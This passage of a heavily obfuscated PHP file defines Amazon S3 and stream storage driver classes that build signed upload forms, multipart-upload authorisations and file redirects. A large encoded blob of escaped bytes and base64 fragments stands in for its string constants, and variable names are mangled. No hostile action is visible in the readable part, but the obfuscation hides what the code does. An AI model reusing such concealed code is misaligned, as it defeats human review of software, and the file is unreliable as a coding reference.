\x4f\xe6\x99\xf7\x44\xff\x0\xa3\x3\xc2\x77\x37\xeb\x1b\x9e\x70\x87\x3b\x62\x9\x2c\x86\x91\xaf\x70\x46\x40\x1c\xe9\x44\x6b".base64_decode('HZ7foaNUeJacMBNNM11J+KQ5wZ1aV6CkSBgDFC3A1ipx4HxCMuzD5OlVsUSSuQ==').base64_decode('QdGTJDYvBAwfRA01BCtFtlVJrZvKlgqDTVKkYhuGklcLYyANTLIaJ1lzcEVNkw==')."\174\15\3\26\12\0\275\346\16\11\361\76\42\334\123\121\217\14\20\103\365\352\76\354\61\336\207\67\251\50\273\2\322\223\53\161\157\341\105\362\15\55\354\11\367\166"."\204\272\245\303\161\11\220\150\155\353\116\4\172\172\52\106\160\246\4\153\353\360\221\222\157\71\173\20\43\305\260\152\256\236\317\50\51\154\163\333\124\205\241\125\212\145"."\246\230\133\306\52\77\320\121\222\100\310\117\163\165\310\122\215\263\50\3\10\115\274\344\213\106\127\317\233\353\327\347\361\301\26\376\57\114\103\230\24\373\374\47\141\11"."\xca\x8f\xcf\x9d\xb\xa7\xe0\xd9\x95\x8f\xc1\x8\xb4\x5d\x78\xbb\x50\x94\xb9\xaa\x42\xc7\xb1\xa9\x1a\x1f\xa\xe\x54\x2b\x59\xb4\x1f\x73\xcb\x9a\x79\xee\xcc\xdd\xec\xa0\x66\xae\x5f\x95".base64_decode('I/HKihqMxeWC0jDXmFc8CgikXG6+W9XCgvIsuHBfSo6iM0mMnsvT+4kmwC9kQg==')."\xe7\xd9\x8\x3f\x4e\xa8\x80\x14\x3e\xfe\xa6\x46\x51\x4d\xd\x62\x8c\x12\xe4\x1f\xea\x84\x88\x1e\x2c\x86\xd0\x8\x87\x73\x6a\x5b\x3a\xe8\x2b\xe1\x4b\x7\x44\xe3\x6d\xa\x9f\xfb\x2b\x56"."\xd0\x82\xf0\x8e\xbf\x6a\x55\x39\xc\xec\x83\xdc\x51\x81\xa2\xee\x6\x61\xcc\x71\xc3\xb0\xc8\x2d\x60\x68\x1f\x73\x56\x43\xb1\x56\x4e\x24\x20\x2c\xd\xfd\x15\x79\xc2\xdd\x1d\x22\x40\xc5"."\xe\x47\xe4\x52\x66\x8a\x47\x42\x7d\x4b\xab\x7d\x93\x57\xad\xf2\xeb\xec\x80\xbd\xaf\xca\x99\xd7\xc7\x53\xd3\x70\x9f\xcf\x99\x1e\xf5\x4\x86\x9e\x27\x4\x80\x3b\x25\xe5\x1f\x4f\x83\xc5".base64_decode('N9E/WVxx4AfpCj5db2qat5QfsPSzOMYE6vWz2PSPZ73xhfyztVuwuRzJKT3xEQ==')."\x75\x49\xc0\xe9\xf7\xb1\x79\x98\xfb\x86\xa7\xa3\x2a\x7f\x7\x8a\x45\x39\xc8\x9e\x48\x20\xca\xfe\x9c\x9e\xf4\xf3\xd5\x4e\xf\x0\x7c\x29\x61\xeb\xcf\x92\x10\x5a\xe3\x82\xe3\x53\x70\x57".strrev('¾"©–ŞÂ•I4«®_óxŠª}è;h½L¥k˜ÿ qeG'."\r".'Üµ×Daà&`¶').base64_decode('i6sQXaIxQBBEU+ZiAqSYWq6pijTXymoayk9ITKVKUMYqhVHHvMpHzLQNtPFxqw==')."\x73\x78\x47\xa3\x37\xa\x46\xb4\x81\x6e\x38\x60\x1\x96\xea\xa4\x33\xe8\xef\xc9\x27\x31\x44\x21\xf\xb7\xe4\x34\x93\x5a\xa\x12\xaa\x43\x8e\xdc\x6\x84\x4e\xb\x9e\xf5\xe8\x89\x46\xe2".base64_decode('kVb2MkIl5VcD418tek1CyDnMint+cLEzBecI/ACB6TdLhQI3W8AsIt+2iMyrpQ==').base64_decode('YQ3Q46tYtmSL7Q87Oo7jy2QWgCXPVNgvFsq8lOohm+qYyS6zdBC3BlhKcghJqA==').base64_decode('ciHT74iqUDzVE+PK2UpyaDdos3IG8+M1ta6uzltXj/7yE1ng1BrZtWMpSV1dIw==')."\371\113\43\210\362\26\346\302\31\203\226\76\243\131\220\140\104\323\240\101\260\41\344\365\102\211\61\123\113\133\361\125\0\5\67\255\237\361\17\254\375\150\32\310\275\71".strrev('‰§•zÏ L”İù{@ ÉTh4ñì¦0ûe‰…J?sHAøœ…à"Hæ>F')."\x37\x2a\x58\x48\x2f\x95\x2b\xf3\xb1\xc1\xa5\x40\xe1\xf0\xd3\xcb\x22\xbc\xb2\x3\x6d\xc8\x44\x37\x6\x71\x8e\xe0\x68\x1a\xca\xe3\xf4\xdb\x85\x21\x68\x83\x4e\xf1\x7e\x62\x80\xa4\xd\x21"."\x97\xc\xf9\x5d\xd\x12\xca\xf1\xab\xa7\x38\xd8\xcd\x93\x52\x47\xec\xf4\x96\x4\xc\x52\x5\x54\xcd\x1a\x23\x9\xb1\xc9\xe2\xe0\x69\x3c\x44\xc6\xc\xcb\x42\xc\xcf\xd2\xd2\x7d\x1a\x3c".base64_decode('cIzcMrxiBxZgOEAuWw7qOcetsIRUtjxcc3BCeRjQYgxwj/OI5mF+miEFrCwxEQ==')."\x3e\x81\x4e\xc4\x95\x27\x79\xeb\x8a\x1a\x13\x35\x4e\x2c\x9b\x2f\xdb\x3d\x57\x64\xd8\x4d\x43\x5c\xf1\x2a\x7b\x34\x8e\x85\xa4\x1b\x9e\x4c\xc1\x1d\xfb\xa\x33\x17\x6\x9\x32\x0\x35\xc".base64_decode('aeWeuaQC3FGuPIG09J6ZJVxytXJ/gLKfLnqQLplbWOB0WJycszKGJXnGVzSNDA==').base64_decode('mixL7iuC91QG8+TlKSsk4h2S08lAfL7AntYCvBO3w1Tx6J+UtOx8AgOd60qKaA==').base64_decode('5c87yEAsH8m2EuSir7MMLHg5IbxlX4IrTGC24Rk26dofJBO0ASszZLWqbjAzDA==')."\74\32\342\110\324\11\247\60\52\276\72\16\150\342\204\274\344\64\366\2\34\20\40\202\367\270\0\142\256\342\32\100\201\253\260\330\232\232\344\154\316\270\67\57\270\214".base64_decode('fVzOUuEh5No3WfWMhy8haxbwouvkD49VQDonYpVhENmkcQGNnD5JISRWMc4rzQ==')."\xda\x3b\x54\xd2\x18\xb7\x28\x11\x33\xc5\x16\xa4\xc\x8\x4f\x3c\x6b\x1a\xb6\x2d\xdf\xf4\xe\xa4\x25\xa\x1c\x96\x79\x85\x38\xcd\xe2\x9d\x27\xea\x71\x9c\x54\x49\x2e\x3c\x79\x52\xb4\xbb"."\xb0\xda\x55\xb6\xe3\x10\xdb\x28\xe2\x7a\x5a\x12\x6e\x5c\x41\xb7\xfd\x14\xd9\x1d\x6c\x46\xff\x99\xef\xd3\x2\x7f\x1c\x4\x4f\x67\x4c\x32\x5f\xa9\x50\x3\x64\xe2\x59\x60\xdb\x32\xb5\x94"."\141\22\51\127\272\266\132\260\243\132\106\16\206\15\56\335\343\223\21\255\102\21\330\57\201\204\342\30\13\220\334\131\222\275\34\110\256\123\121\110\362\125\53\261\37\336"."\x7a\x85\xf3\x2d\x9\x5a\x32\xd\x4c\x91\x22\x48\xfa\x4a\x2c\x8c\x4b\xc7\x24\x19\xa5\x12\xb1\x3a\x56\x4a\x72\x75\xbe\x8b\xb1\x60\x76\xae\x8a\xbc\x6f\x33\xc3\x55\x5c\x0\xb9\x30\x8e\x7b".base64_decode('YMlxqFjsJlH0TM5C6izLQuPwziosXOUYC8lheKj2HlOhKhIljWiKO6+A0RGDBA==').base64_decode('EWMaM5Hz1k/1TgNNsmz8ythaoFloLUhogLl7RgfB3g3SiTSG9AAZuVwtLp+Sew==').base64_decode('5Hw+yYVzHjKlfUvjtnDk5rVMVsRZNjWRwwl6K8XTEcLRbQ4LQlcCtDKc8eAPNw==')."\xef\x78\x50\x16\xe1\x81\xc3\xc\xc5\x55\x8\xf8\x3c\x96\xfd\xfc\x92\x5c\xa2\x1f\xc2\x18\x13\x81\xc\xea\x75\x57\x1a\x18\x71\x26\x4f\xef\xa4\x33\x2b\x52\x4e\x97\x4\x38\x6e\x70\x60\xf9"."\xb9\xbe\x8f\x5b\xd1\xc2\x1d\x20\x78\xe9\xab\xa6\x16\xdf\x1\x72\xe8\x52\xba\xc6\xf8\x5d\xe\x6c\xa\x83\x37\x9\x6e\xca\x68\xc9\x1\x16\xcb\x91\xd3\x72\x4\xa8\xe9\x8f\x23\x37\x7\xf1".base64_decode('VCPM0wuX+Xs6e/wc1MKGid/KBYFRvB3V2shNntgrtCN5PaWEIx2h1kC4LRSbrw==')."\144\64\133\172\113\231\70\257\166\256\151\242\353\242\63\300\320\73\311\375\67\343\117\157\22\161\227\336\64\347\271\55\301\135\113\226\120\322\343\24\316\142\51\42\152\146".strrev('Ñ©œ´¹_HĞªPÊX´VJycôòµ4\\JKB„çRx5ƒÉ=W;ÏWˆ‰Y')."\254\25\366\326\170\275\60\254\133\272\240\0\54\307\230\134\272\320\121\232\334\205\170\132\366\70\56\315\200\30\154\132\113\271\177\27\160\150\41\73\256\165\111\313\164\232"."\144\107\100\105\246\161\207\167\221\204\313\172\22\224\36\23\50\232\252\156\151\22\200\172\265\237\14\6\377\110\266\167\274\366\223\33\220\202\45\347\126\132\261\252\4\255"."\x80\xc1\x24\x5f\x43\x95\x12\x44\xf1\x43\xad\xff\xeb\xa6\xea\x69\xe1\x85\x43\x4f\xb3\xc3\x7d\x7e\xc9\x81\xfa\x44\x6e\x95\x5f\x86\x62\x75\x96\x3d\x98\xf0\x95\x4f\x2f\x78\x24\xcf\x0\xc4".base64_decode('owF734U8Tw0HMPxwO0Gv84sqkPBmjhXlQyJ/2s+HmH5g10ZBpi3GAcEJ4+RQGg==')."\256\216\312\102\110\62\303\152\27\306\63\63\113\77\104\17\140\234\35\207\244\256\107\44\334\206\220\216\347\130\313\352\300\146\134\120\16\121\354\240\224\375\242\163\50\304"."\xfd\x9c\x8b\xac\xee\x98\xa\xd\x40\xd1\x8a\x50\x5d\xf0\x4\x4a\x93\x52\x47\x9f\x35\xe1\x9e\xab\x95\xb9\xec\x76\x96\xa8\x80\xb8\x7\x9\xe6\x8b\xb6\x43\x4e\xec\x94\x2d\xa0\xa5\xb9\xa1"."\x0\xc2\xda\x8\xd9\x0\x9b\xa8\x18\xf9\xb1\x32\x80\x43\x5f\x11\x66\xed\xe2\xf6\x6e\xd8\x6f\x77\x61\xc0\x90\xc7\x8f\x10\x5e\x6c\xce\x4e\xdf\x1c\xa2\x2\xa9\x7\x31\xf7\x9a\x5d\xfe\xc"."\x1\xcd\xfe\xff\x25\x23\x8d\x8c\x49\x56\x80\xce\x42\xca\x1b\x64\xb9\xf7\x36\xc1\x67\xe1\x17\x16\xb2\xc6\x88\xf3\xe1\x21\xc\x71\xbf\xa9\xe0\x78\x4d\x41\x5a\x34\xe4\x4a\xaf\xfc\xfe\x3"."\363\302\217\130\130\307\123\31\122\201\223\350\117\37\374\262\315\310\135\64\45\77\120\173\55\107\225\126\307\63\364\22\240\113\23\262\45\311\205\15\15\124\366\260\35\177"."\44\107\140\31\367\307\316\375\257\213\225\115\136\153\151\333\113\72\27\130\161\72\242\27\376\375\305\106\351\364\200\316\217\26\55\261\42\54\333\341\141\77\156\304\325\214"."\207\362\141\230\264\211\120\313\230\374\55\33\142\222\116\243\110\246\345\111\363\111\237\47\45\140\317\335\244\75\344\55\26\112\357\334\216\341\245\345\306\211\250\234\73\223"."\x33\x92\x6a\x2e\x4a\xed\x95\x1c\x37\x20\x4c\x24\x43\x71\x1b\x44\x47\x32\xa\xf2\xab\xc5\xe2\x5e\x8f\x3e\x28\x10\x8e\x41\x4a\x85\x10\x55\x29\x3b\xa0\xa6\x24\xa3\xc9\xa6\xb0\xf4\xc0\x47"."\134\52\202\344\250\266\36\172\302\3\335\226\213\144\247\156\134\211\331\56\275\172\352\57\77\245\303\366\124\100\34\144\163\103\70\60\365\311\102\24\44\120\346\52\142\202".base64_decode('HWsSIwTiZD3kgyx6men+EijHQ+fTARRhyU+bNsAlEBwWG7N8ZViczrtfoWHV8A==')."\47\165\74\264\147\342\241\64\372\200\216\207\77\226\343\241\316\241\74\360\104\216\107\134\16\373\262\327\7\304\143\206\316\27\20\161\233\271\175\136\231\50\340\226\2\370"."\120\271\62\104\335\3\27\67\312\165\203\342\154\262\120\312\213\323\136\24\160\112\105\145\35\226\172\130\62\163\36\162\62\353\141\36\162\134\303\41\172\45\317\114\205\61"."\374\352\62\250\231\46\21\165\322\116\252\323\70\67\151\262\323\55\167\62\335\201\165\11\123\23\227\44\250\253\262\262\127\56\26\347\323\123\247\115\237\55\253\24\304\374".base64_decode('iHMi5niT/gDLIGZcceKTwvyjyeuWRDotaMvfsnJR4P8d5gtWnSaV7FnLX/wrGw==').base64_decode('AYKEkhWItH+5jvwNfBJvieVDdyzxgpWzLrqHV+iHtO+IlUCfFDJyWLLNY+2sbQ==')."\252\116\351\255\222\220\102\106\202\111\104\72\171\216\123\163\267\235\14\14\350\60\104\264\44\305\310\45\332\206\133\1\203\263\343\175\211\350\377\42\205\34\354\262\370\322"."\xab\x58\x53\x12\x49\xf9\x5f\x4c\x20\x13\x54\xa8\x4c\x23\xc\x3e\x2a\xf4\xdc\x7f\x2a\xa3\x1b\x15\x9e\x8c\x92\x4e\xcd\xbf\xa4\xdd\x94\xc5\xe2\x42\x99\x57\xb5\xbd\x12\x42\x4a\x4a\x3b\xcd".base64_decode('jpAJBmZFyIjOvrqKR9lEGf0eZW+Jyvks6WUp4d1D4rBwbna7bi8iNiNO8ptZdg==').strrev('ÄIĞğqì•LË~eĞ÷Úå…í5DÑyA—’'."\n".'Dn¾Puä«V:…tÈV')."\31\362\267\363\12\167\204\271\164\103\74\221\103\176\103\341\66\327\33\202\204\344\270\37\26\144\375\47\353\134\220\60\351\272\242\103\130\340\157\300\70\204\7\313\375\74"."\23\342\236\144\147\213\50\310\61\34\366\112\240\165\304\324\231\326\346\161\77\263\131\224\156\153\273\136\15\226\264\244\316\367\200\35\267\72\261\37\12\327\262\146\167\105".strrev(')áÜáúº¥Õ&ÕÉq¯˜Ë?'."\0".'vO³é½4C=oşˆ÷ïÿ÷ŒfıaÔi£×-')."\x6b\xf1\xe8\xa6\x14\xe6\xf6\x9c\xcc\x17\x9\x73\x51\xa2\xb2\xf3\x17\x35\x97\x73\x1f\x46\x96\x49\x0\x65\xaf\xb5\x21\xe4\x1b\xe4\x4f\x8c\x55\xa\x94\x3f\x92\xea\xc0\x33\xc6\x49\x4a\x4f"."\164\352\251\301\12\207\205\170\264\303\116\67\223\322\376\137\226\114\220\42\304\46\60\247\54\176\366\225\302\2\24\146\22\31\5\224\357\35\106\212\114\324\252\5\242\333"."\177\52\243\24\344\46\63\20\14\231\110\70\100\145\244\45\356\30\103\7\120\36\36\361\304\60\177\340\324\221\243\313\365\136\25\115\144\311\143\353\320\131\227\237\35\227".strrev('öix¡ä+A¬rÊg”X¢+êÔeyozÑEûh€şZ^Í‚ÎVëæç')."\202\351\225\327\33\177\47\114\310\263\370\113\356\57\133\267\75\246\101\170\55\47\224\253\67\44\213\103\351\65\313\262\327\352\134\307\3\110\360\21\347\145\272\101\174\314"."\102\267\143\275\135\65\344\342\4\140\52\342\333\245\107\276\355\174\221\352\313\344\355\222\335\112\222\14\176\1\344\320\152\131\262\213\160\147\116\154\302\355\134\51\363\52".strrev('Ì‘\'+úv›\'îÎ’¤áÂ¾!Õ¹Rä"_Ã·_ã…4c¶€ƒñiJğã%%¦K%')."\x1c\x7d\xb1\x47\xe0\xc5\xe9\x93\xf3\xf0\x8f\x3b\x44\x2d\xa3\x54\x25\x3d\x2c\x45\x93\x5c\xcc\x6b\xc\xfa\xc5\xb7\xb3\x42\xe2\xae\x3e\x89\xa6\xea\xf4\xc0\xb0\x6a\xb3\x23\x34\x77\x2e\xe7".strrev('õc4ÒGZ]üÓ¦èÁ ‹§jÎ‰p]‚AÅ†Ë<ûIRH4ü°NàŠaQÒ¡[').strrev('Âùvg,Ÿu*Ãt@˜âü¥BXHê$¾O ìıÄmc'."\n".'|.‘­˜¶ÄA9')."\x29\x47\x2a\x1\xa2\x3e\xa0\xb9\x11\x8d\x24\x54\x60\x5b\x79\x61\x5d\x43\xbb\xc2\x25\x64\x51\xa5\xf3\x7a\x2b\x4f\xc6\xe7\xc\xa5\x21\x37\x13\xbc\xe\xa8\x4b\x4c\xc2\xfa\x6\xb6\x63\xbb".base64_decode('oiz5yV3nCaAssksooOXCUnHy6eBeM8QqVyKw0jnE0j1hEcE2K8Mx+BKx4x2DlA==')."\x51\x39\xd2\xd1\x1c\xf7\xd4\x12\xe\x5f\xa0\x2f\x5\xe6\x89\x4a\x93\xc6\x5\x9c\x51\x34\xbd\xe6\x6a\xbd\x9c\xc1\xdd\x33\x9a\xc3\x1a\xd1\xed\x54\x56\x12\x3b\xca\x23\xcb\xe1\x66\xd9\xa0"."\x42\x45\x95\xdb\xeb\x6e\x15\x1b\x53\xb7\x30\x26\xa\x29\x6b\x8f\x64\x62\x10\x37\x2a\xe4\xa1\x2d\xaa\x98\x8d\x46\xe1\x9c\x82\x5d\x74\xe4\xdd\xcb\x10\xe0\xbc\x34\xa\xe7\x2d\x8b\x66\x99"."\x25\xdd\x85\x94\xcf\x56\x4b\xd6\x5e\xba\x57\x3e\x78\x20\xd0\xa7\x2b\x74\xd8\x25\xf6\xd2\xa4\x7b\x1b\xcf\x8a\x89\xcb\xab\x3\x8c\x73\xa7\x26\x1a\x80\xca\xad\x10\x82\xbb\xeb\x84\xb7\x52"."\x2b\x2a\x26\xde\x6b\x2b\x2a\x3c\x76\xd\xe\xd4\x2a\xd0\x5a\x16\x53\x81\xba\x8a\x33\xff\x72\x3a\x2e\xe2\x2a\x58\x20\xd0\x32\xf1\x1e\x2d\x3b\xf3\xa9\x10\x2d\x9b\x33\x54\x36\x78\x88\x56"."\x5c\xfa\x96\xd3\x12\xc1\x5\x97\x7\x86\x59\x25\x21\xe1\x4c\x3c\x9f\x2c\x59\xf4\x4e\x72\x90\xf4\x52\x61\xb0\x60\xf0\x6d\x22\x2d\x6c\xc7\xb0\x69\x2a\x7f\x70\x98\x57\x57\x56\x9a\x13\x35"."\xb\x25\xc9\xaa\xb4\xa2\x81\xb1\x7\x8b\xd2\xe5\x42\x6b\x4e\x65\x3a\x70\xc9\x32\x9b\x4a\x2d\x86\xad\xa7\x24\x6b\x28\x61\x93\xca\xbb\xa9\xb\x36\x3e\x27\xe9\xda\x5c\x6a\x2e\x21\xd8\x3b".strrev('ß’(Ü\\p{i†c£I~èy^,#òÚŸ­4ôèôıÓ»XvN¡5Ø‚(+ÊÎ')."\303\266\305\351\62\25\227\11\223\207\67\75\217\144\44\201\276\304\171\11\36\105\242\302\47\350\110\310\6\371\204\163\75\54\207\306\64\32\113\210\215\43\200\217\6\170"."\100\336\323\340\174\257\275\344\72\201\24\0\44\104\46\215\121\346\71\17\337\242\25\355\21\357\24\253\156\106\116\360\40\200\157\262\311\7\271\253\154\371\151\214\37\334"."\xa\x7b\x49\x19\xf0\xde\x89\x6f\x79\x31\xe3\xc8\x4e\x5f\x70\xe0\xf6\x8c\x5f\x56\x2\xa8\x21\x45\x11\xd4\xdd\x28\xd1\x20\x61\xc7\xbb\xc1\x45\xa1\x58\x3c\x56\x16\xd5\x13\x88\xc5\x16\x46".base64_decode('om3UO2lZNMklmdCURfV0Rrr3FhfsCoTCZXHY2qY7IVwr0ahQD2llIByOLNxbKw==')."\102\255\363\105\113\310\241\251\320\156\27\263\6\123\132\63\355\177\114\315\61\131\132\272\200\247\345\205\217\55\221\307\251\42\220\347\325\142\356\347\370\207\323\207\277\313"."\272\215\41\54\24\204\55\145\272\241\354\150\21\240\330\133\53\137\334\234\131\46\35\222\255\350\304\261\260\317\161\174\54\301\311\142\41\44\106\102\102\171\167\45\200\311".base64_decode('FUdMVpWWq+5JrBgR3NLTDDDAWm4kJdU8lV3gVhyMsWQeRb8h+v8Ap+e4Y5qhAA==')."\x0".base64_decode('').""."".""."", 10, -8))); goto Dç’ãµÕİš; AŠÖÙù–òå: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($©âÂÒ) { parent::__construct($©âÂÒ); } public function uploadFormData($Ûêäû²Í, $ •¸«ºë = 3600) { $ÊÑôÙ¤„ =& $_SERVER[ÏÒ Ì„]; $Î‡ô¦œı = $ÊÑôÙ¤„[192]; $˜ØÍ¨¬á = $ÊÑôÙ¤„[1272]; $Òıåú± = $ÊÑôÙ¤„[59]; $ûÍÖëÍÜ = gmdate($ÊÑôÙ¤„[1273]); $ó£®Š¿¤ = gmdate($ÊÑôÙ¤„[741]); $Ë»Ó–´É = $ÊÑôÙ¤„[1274]; $³Ò¢‡ = $ •¸«ºë . $ÊÑôÙ¤„[33]; $ıøéŠÉ­ = $ÊÑôÙ¤„[1234]; $ã£©÷å… = array($this->accessKey, $ó£®Š¿¤, $this->region, $Òıåú±, $Ë»Ó–´É); $ƒè±éõê = implode($ÊÑôÙ¤„[8], $ã£©÷å…); $´âï²± = array($ÊÑôÙ¤„[1236] => gmdate($ÊÑôÙ¤„[1235], strtotime($ÊÑôÙ¤„[1275])), $ÊÑôÙ¤„[1237] => array(array($ÊÑôÙ¤„[1239] => $this->bucket), array($ÊÑôÙ¤„[1238] => $Î‡ô¦œı), array($ÊÑôÙ¤„[1240], $ÊÑôÙ¤„[1241], $ÊÑôÙ¤„[33]), array($ÊÑôÙ¤„[1240], $ÊÑôÙ¤„[1276], $ÊÑôÙ¤„[33]), array($ÊÑôÙ¤„[1240], $ÊÑôÙ¤„[1277], $ÊÑôÙ¤„[33]), array($ÊÑôÙ¤„[1242] => $ıøéŠÉ­), array($ÊÑôÙ¤„[1278] => $ƒè±éõê), array($ÊÑôÙ¤„[1279] => $˜ØÍ¨¬á), array($ÊÑôÙ¤„[1280] => $ûÍÖëÍÜ), array($ÊÑôÙ¤„[1281] => $³Ò¢‡))); $»—¦¾Ú = base64_encode(json_encode($´âï²±)); $÷òÃŒ¿é = hash_hmac($ÊÑôÙ¤„[1282], $ó£®Š¿¤, $ÊÑôÙ¤„[1283] . $this->secret, !0); $ó«îŠÃ = hash_hmac($ÊÑôÙ¤„[1282], $this->region, $÷òÃŒ¿é, !0); $öö¿ƒ… = hash_hmac($ÊÑôÙ¤„[1282], $Òıåú±, $ó«îŠÃ, !0); $Æ“±‚¯º = hash_hmac($ÊÑôÙ¤„[1282], $Ë»Ó–´É, $öö¿ƒ…, !0); $æÕğ–¾ = hash_hmac($ÊÑôÙ¤„[1282], $»—¦¾Ú, $Æ“±‚¯º); $€Ò÷¯Š× = array($ÊÑôÙ¤„[211] => $ÊÑôÙ¤„[33], $ÊÑôÙ¤„[1284] => $ÊÑôÙ¤„[33], $ÊÑôÙ¤„[1238] => $Î‡ô¦œı, $ÊÑôÙ¤„[1242] => $ıøéŠÉ­, $ÊÑôÙ¤„[1246] => $»—¦¾Ú, $ÊÑôÙ¤„[1285] => $ƒè±éõê, $ÊÑôÙ¤„[1286] => $˜ØÍ¨¬á, $ÊÑôÙ¤„[1287] => $ûÍÖëÍÜ, $ÊÑôÙ¤„[1288] => $³Ò¢‡, $ÊÑôÙ¤„[1289] => $æÕğ–¾, $ÊÑôÙ¤„[175] => $this->getHost()); return $€Ò÷¯Š×; } public function multiUploadFormData($¡Ğ€ÎëÔ, $§Ìü¥ÓË = 3600) { $ŸŒßúèë =& $_SERVER[ÏÒ Ì„]; $ĞùÚ‚‚» = gmdate($ŸŒßúèë[1366]); $Å³¼‡åÅ = array(); $®ó…çÔ = $this->client->getUploadId($this->bucket, $¡Ğ€ÎëÔ, $Å³¼‡åÅ); if (!$®ó…çÔ) { return !1; } return array($ŸŒßúèë[221] => $®ó…çÔ, $ŸŒßúèë[175] => $this->getHost() . $ŸŒßúèë[8] . $this->pathEncode($¡Ğ€ÎëÔ), $ŸŒßúèë[222] => $ĞùÚ‚‚», $ŸŒßúèë[93] => $¡Ğ€ÎëÔ); } public function multiUploadAuthData($šş™É”Ö, $õùŒÀ = array()) { $óÎÍ§‘· =& $_SERVER[ÏÒ Ì„]; $§€ü¾ô§ = isset($õùŒÀ[$óÎÍ§‘·[168]]) ? $õùŒÀ[$óÎÍ§‘·[168]] : $óÎÍ§‘·[33]; $èøë‡·’ = $õùŒÀ[$óÎÍ§‘·[93]]; unset($õùŒÀ[$óÎÍ§‘·[93]]); if (isset($õùŒÀ[$óÎÍ§‘·[223]])) { return $this->listUploadParts($èøë‡·’, $õùŒÀ); } $øÂ¹â² = array(); if (isset($õùŒÀ[$óÎÍ§‘·[1367]])) { $øÂ¹â²[$óÎÍ§‘·[1368]] = $õùŒÀ[$óÎÍ§‘·[1367]]; } $Î³§°Œ = explode($óÎÍ§‘·[177], $this->getHost()); $¿©²â¿ = array($óÎÍ§‘·[1369] => $Î³§°Œ[1], $óÎÍ§‘·[1370] => $óÎÍ§‘·[33], $óÎÍ§‘·[211] => $óÎÍ§‘·[119], $óÎÍ§‘·[1284] => $õùŒÀ[$óÎÍ§‘·[78]]); $µ¦ª÷Ê÷ = $óÎÍ§‘·[226]; $å¡ÊŸºÑ = $óÎÍ§‘·[8] . $this->pathEncode($èøë‡·’) . $§€ü¾ô§; $‚°æÀ¼ = $this->client->__getSignatureV4($øÂ¹â², $¿©²â¿, $µ¦ª÷Ê÷, $å¡ÊŸºÑ); if (strpos($§€ü¾ô§, $óÎÍ§‘·[225]) === 0) { if (isset($øÂ¹â²[$óÎÍ§‘·[1368]])) { $Š§öü€ = $øÂ¹â²[$óÎÍ§‘·[1368]]; } else { if (isset($‚°æÀ¼[$óÎÍ§‘·[1368]])) { $Š§öü€ = $‚°æÀ¼[$óÎÍ§‘·[1368]]; } else { $Š§öü€ = hash($óÎÍ§‘·[1282], $óÎÍ§‘·[33]); } } return array($óÎÍ§‘·[232] => $‚°æÀ¼[$óÎÍ§‘·[232]], $óÎÍ§‘·[1368] => $Š§öü€, $óÎÍ§‘·[222] => $‚°æÀ¼[$óÎÍ§‘·[1371]]); } return $‚°æÀ¼[$óÎÍ§‘·[232]]; } public function listUploadParts($æï»Í¶É, $öğÃ¬è = array()) { $»¤¦úü… =& $_SERVER[ÏÒ Ì„]; $èùª­î¡ = str_replace($»¤¦úü…[233], $»¤¦úü…[33], $öğÃ¬è[$»¤¦úü…[168]]); $ à½‘¶ = $this->client->listParts($this->bucket, $æï»Í¶É, $èùª­î¡); if (!$ à½‘¶) { return !1; } $é»ÕËîİ = $»¤¦úü…[1372]; foreach ($ à½‘¶ as $ôòËüÏ£) { $é»ÕËîİ .= $»¤¦úü…[1373] . "\74\120\141\162\164\x4e\165\x6d\x62\x65\162\76{$ôòËüÏ£[$»¤¦úü…[1329]]}\x3c\x2f\x50\141\162\x74\x4e\165\155\x62\145\x72\x3e\12" . "\x3c\105\x54\141\147\x3e{$ôòËüÏ£[$»¤¦úü…[1330]]}\x3c\x2f\105\124\141\x67\x3e\xa" . $»¤¦úü…[1374]; } $é»ÕËîİ .= $»¤¦úü…[1375]; $æ…¶ÍÂ = array(); $å™«ˆã» = explode($»¤¦úü…[177], $this->getHost()); $ß³±ë¤ = array($»¤¦úü…[1369] => $å™«ˆã»[1], $»¤¦úü…[211] => $»¤¦úü…[119], $»¤¦úü…[1284] => strlen($é»ÕËîİ)); $ÌÜ­Æ°‘ = $»¤¦úü…[224]; $¡”œäË = $»¤¦úü…[8] . $this->pathEncode($æï»Í¶É) . $öğÃ¬è[$»¤¦úü…[168]]; $™ñµ·°ä = $this->client->__getSignatureV4($æ…¶ÍÂ, $ß³±ë¤, $ÌÜ­Æ°‘, $¡”œäË, $é»ÕËîİ); return array($»¤¦úü…[232] => $™ñµ·°ä[$»¤¦úü…[232]], $»¤¦úü…[222] => $™ñµ·°ä[$»¤¦úü…[1371]], $»¤¦úü…[234] => $ à½‘¶, $»¤¦úü…[1368] => $™ñµ·°ä[$»¤¦úü…[1368]]); } public function link($·¢ò®÷Ã, $šñĞç”€ = array()) { return parent::link($·¢ò®÷Ã, $šñĞç”€); } public function fileOut($ÌòëöŠà, $¸¯ÆÄÁ˜ = false, $‡»è“÷ = false, $òÒ¶ôÎ§ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ÏÒ Ì„][1376])) { return parent::fileOutServer($ÌòëöŠà, $¸¯ÆÄÁ˜, $‡»è“÷, $òÒ¶ôÎ§); } parent::fileOut($ÌòëöŠà, $¸¯ÆÄÁ˜, $‡»è“÷, $òÒ¶ôÎ§); } public function fileOutImage($ºä‘Ğ·, $ïİ™¶‡³ = 250) { if (strstr($this->endpoint, $_SERVER[ÏÒ Ì„][1376])) { return parent::fileOutImageServer($ºä‘Ğ·, $ïİ™¶‡³); } parent::fileOutImage($ºä‘Ğ·, $ïİ™¶‡³); } public function fileOutLink($Í¡ˆº²¿) { $¢íäÖÆà =& $_SERVER[ÏÒ Ì„]; if (substr($Í¡ˆº²¿, 0, 7) == $¢íäÖÆà[1249]) { $Í¡ˆº²¿ = $¢íäÖÆà[1250] . substr($Í¡ˆº²¿, 7); } header($¢íäÖÆà[159] . $Í¡ˆº²¿); die; } public function getHost() { $ïÔ•¼Ââ =& $_SERVER[ÏÒ Ì„]; $±‚¯±ï = str_rtrim(parent::getHost(), $ïÔ•¼Ââ[8] . $this->bucket); $±‚¯±ï = explode($ïÔ•¼Ââ[177], $±‚¯±ï); return $±‚¯±ï[0] . $ïÔ•¼Ââ[177] . $this->bucket . $ïÔ•¼Ââ[95] . $±‚¯±ï[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($´«Ãè¥Ï, $áŞŠˆÃä = 0) { parent::__construct(); $this->source = $´«Ãè¥Ï; $this->sourceSize = $áŞŠˆÃä; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function 